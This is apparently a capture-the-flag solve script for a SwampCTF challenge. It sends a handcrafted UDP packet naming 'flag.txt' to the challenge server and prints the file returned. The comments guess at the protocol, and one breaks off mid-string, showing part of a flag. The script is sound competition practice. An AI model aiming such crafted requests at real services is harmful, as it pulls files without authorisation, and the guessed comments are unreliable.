import socket # Importing the socket library to create a network connection
# Define the server's address and port number
server = "chals.swampctf.com"
port = 44255
# Construct the payload that will be sent to the server
payload = (
         b"\x02" # The first byte is likely a protocol identifier or header (starting byte)
          + len(b"swampCTF").to_bytes(1, "big") # Length of the first string ("swampCTF{y0u_k
           + b"swampCTF" # The first string, which is the value to be sent to the server
            + len(b"flag.txt").to_bytes(1, "big") # Length of the second string ("flag.txt") in a single byte
             + b"flag.txt" # The second string, which is the value to be sent to the server
             )
# Create a UDP socket (AF_INET for IPv4, SOCK_DGRAM for UDP)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Send the constructed payload to the server at the specified address and port
s.sendto(payload, (server, port))
# Receive the response from the server, up to 4096 bytes
response, addr = s.recvfrom(4096)
# Close the socket after receiving the response to free up resources
s.close()
# Print the response in hexadecimal format for inspection (useful for debugging)
print("HEX response:", response.hex())
# Print the decoded response (decoding may ignore non-UTF characters)
print("Decoded response:", response.decode(errors='ignore'))
